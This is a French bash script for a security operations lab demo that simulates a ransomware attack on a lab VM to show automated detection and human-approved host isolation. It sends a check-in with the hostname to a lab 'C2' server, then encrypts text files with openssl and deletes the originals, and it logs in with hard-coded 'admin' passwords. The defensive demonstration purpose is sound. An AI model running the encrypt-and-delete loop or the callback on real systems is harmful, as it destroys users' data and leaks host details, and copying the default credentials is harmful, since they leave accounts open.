#!/usr/bin/env bash
# =============================================================================
# NEXUS SOC LAB — Scénario 3 : RANSOMWARE + RÉPONSE SOAR AUTOMATISÉE
# =============================================================================
# Simule un ransomware sur vm-cible :
#   1) Callback vers un serveur C2 (vm-kali 10.42.30.30:8443)
#   2) Chiffrement rapide de fichiers dans ~compta_agent/Documents/
#   3) Émission de télémétrie caractéristique (débits, extensions, processus)
#
# Le pipeline NEXUS SOC :
#   • Modèle 1 (réseau) → détecte l'anomalie de débit vers IP suspecte
#   • SOAR joue le playbook "Ransomware" :
#     - enrich_ioc (VirusTotal — mode simulé dans le lab)
#     - snapshot_memory (impact moyen, exécution auto)
#     - isolate_host (impact FORT → attente de validation humaine ⏸)
#     - block_ip (impact moyen, auto)
#     - notify_dsi (rapport push au portail DSI)
#
# Le DSI depuis vm-dsi voit l'action "Isoler le poste" en attente,
# la VALIDE d'un clic → l'isolation est exécutée. Rollback possible ensuite.
#
# À exécuter DEPUIS vm-cible.
# =============================================================================
set -uo pipefail

if [[ ! -f /etc/nexus-agent/bearer ]]; then
    echo "✗ vm-cible pas configurée."
    exit 1
fi

source /etc/nexus-agent/env
C2_IP="10.42.30.30"      # vm-kali dans VLAN 30 (external)
C2_PORT="8443"
VICTIM_DIR="/home/compta_agent/Documents"

BOLD="\033[1m"
GREEN="\033[32m"
YELLOW="\033[33m"
RED="\033[31m"
RESET="\033[0m"

banner() {
    echo
    echo -e "${BOLD}════════════════════════════════════════════════════════════════════${RESET}"
    echo -e "${BOLD}$1${RESET}"
    echo -e "${BOLD}════════════════════════════════════════════════════════════════════${RESET}"
}

pause() {
    echo
    echo -e "${YELLOW}[Pause démo — Entrée pour continuer]${RESET}"
    read -r
}

emit() { echo "$1" | nexus-emit >/dev/null 2>&1 || true; }

# ── Phase 0 : Vérifier que le C2 sur vm-kali écoute ─────────────────────────
banner "PHASE 0/4 — Vérifier le C2 sur vm-kali"

echo "→ Test de connectivité vers ${C2_IP}:${C2_PORT}..."
if ! curl -s --max-time 3 "http://${C2_IP}:${C2_PORT}/" >/dev/null; then
    echo -e "${RED}✗ Le C2 ne répond pas.${RESET}"
    echo "  Sur vm-kali, exécuter : sudo systemctl start c2-listener"
    exit 1
fi
echo -e "${GREEN}✓ C2 actif${RESET}"

pause

# ── Phase 1 : Callback initial (établissement C2) ───────────────────────────
banner "PHASE 1/4 — CALLBACK C2 (indicateur réseau initial)"

echo
echo "→ Le ransomware simulé contacte son serveur C2 pour signaler l'infection."
echo "  IP destination : ${C2_IP} (jamais vue avant par le SOC)"
echo

# Callback HTTP + télémétrie parallèle
curl -s -X POST "http://${C2_IP}:${C2_PORT}/checkin" \
     -H "Content-Type: application/json" \
     -d "{\"host\":\"$(hostname)\",\"user\":\"compta_agent\",\"campaign\":\"NEXUS-DEMO\"}" \
     >/dev/null

# Signal réseau à envoyer aussi au SOC (le modèle 1 le récupère)
emit "{
    \"type\": \"network_flow\",
    \"src_ip\": \"$(hostname -I | awk '{print $1}')\",
    \"dst_ip\": \"${C2_IP}\",
    \"dst_port\": ${C2_PORT},
    \"protocol\": \"HTTPS\",
    \"bytes_out\": 512,
    \"process\": \"unknown_binary\",
    \"ts\": \"$(date --iso-8601=seconds)\"
}"

echo -e "${GREEN}✓ Callback effectué + télémétrie envoyée${RESET}"

pause

# ── Phase 2 : Chiffrement rapide des fichiers ───────────────────────────────
banner "PHASE 2/4 — CHIFFREMENT DES FICHIERS (débits anormaux)"

echo
echo "→ Le ransomware chiffre les documents de compta_agent."
echo "  Extensions .txt → .locked, débit disque explosif."
echo

# Copie propre pour ne pas casser la démo si rejouée
sudo cp -r "$VICTIM_DIR" "/tmp/_backup_documents_$(date +%s)" 2>/dev/null || true

CHIFFRES=0
for f in "$VICTIM_DIR"/*/*.txt; do
    [[ -f "$f" ]] || continue
    # Chiffrement AES-256 très simple (openssl)
    sudo openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:demo-key \
        -in "$f" -out "${f}.locked" 2>/dev/null && sudo rm -f "$f"
    CHIFFRES=$((CHIFFRES + 1))

    # Toutes les 5 fichiers, on émet la télémétrie "burst d'écriture"
    if (( CHIFFRES % 5 == 0 )); then
        emit "{
            \"type\": \"file_activity\",
            \"user\": \"compta_agent\",
            \"action\": \"write_burst\",
            \"files_modified\": $CHIFFRES,
            \"extension_new\": \".locked\",
            \"bytes_written\": $((CHIFFRES * 4096)),
            \"process\": \"unknown_binary\",
            \"ts\": \"$(date --iso-8601=seconds)\"
        }"
        echo "  ↻ $CHIFFRES fichiers chiffrés (télémétrie émise)"
    fi
done

echo
echo -e "${RED}✗ $CHIFFRES fichiers .txt → .locked. Rançon prête à s'afficher.${RESET}"

pause

# ── Phase 3 : Attendre le SOAR ──────────────────────────────────────────────
banner "PHASE 3/4 — RÉPONSE SOAR (temps réel)"

echo
echo "→ Interrogation du SOC pour voir le playbook Ransomware s'exécuter..."
sleep 3

DSI_TOKEN=$(curl -s -X POST "$SOC_URL/auth/token" \
    -H "Content-Type: application/json" \
    -d '{"email":"dsi@afriland.cm","password":"admin"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")

echo
echo "→ Notifications reçues par le DSI Afriland :"
curl -s -H "Authorization: Bearer $DSI_TOKEN" \
    "$SOC_URL/portal/notifications?unread_only=true" \
    | python3 -c "
import sys, json
data = json.load(sys.stdin)
for n in data.get('notifications', [])[:3]:
    print(f\"  🔔 [{n.get('severity')}] {n.get('title')} — {n.get('created_at','')[:19]}\")
    print(f\"     {n.get('body','')[:100]}\")
" 2>/dev/null || echo "  (aucune notification pour l'instant — attendre 10s de plus)"

echo
echo "→ Actions SOAR déclenchées (interrogation /analyst/pending) :"
ANALYST_TOKEN=$(curl -s -X POST "$SOC_URL/auth/token" \
    -H "Content-Type: application/json" \
    -d '{"email":"soc@nexussoc.cm","password":"admin"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")
curl -s -H "Authorization: Bearer $ANALYST_TOKEN" \
    "$SOC_URL/analyst/pending" | python3 -m json.tool | head -20

echo
echo -e "${YELLOW}⚠  Action 'Isoler le poste' (impact FORT) est EN ATTENTE${RESET}"
echo -e "${YELLOW}   → nécessite validation humaine du DSI${RESET}"

# ── Phase 4 : Validation depuis vm-dsi ──────────────────────────────────────
banner "PHASE 4/4 — VALIDATION HUMAINE (garde-fou clé)"

cat <<EOF

  À montrer au jury depuis vm-dsi :
  ──────────────────────────────────
  1) Firefox → https://soc.nexus.local:8443/app/portail.html
  2) Cloche 🔔 → notification "Ransomware sur POSTE-COMPTA-01"
  3) Clic sur le rapport → visualisation HTML détaillée
  4) Onglet "Actions en attente" → "Isoler le poste"
  5) Bouton VALIDER (ou REJETER)

  Une fois validée par le DSI :
  ──────────────────────────────
  • Le poste est retiré du réseau (interface down simulée)
  • L'audit trail montre : DSI a validé à HH:MM
  • Preuve d'un contrôle humain sur les actions à FORT impact

  Différenciateur face à Crowdstrike/SentinelOne :
  ──────────────────────────────────────────────
  Ces produits isolent AUTOMATIQUEMENT — risque de faux positif qui
  paralyse la direction. NEXUS SOC = validation humaine obligatoire
  pour les actions destructives, avec rollback en 1 clic.

EOF
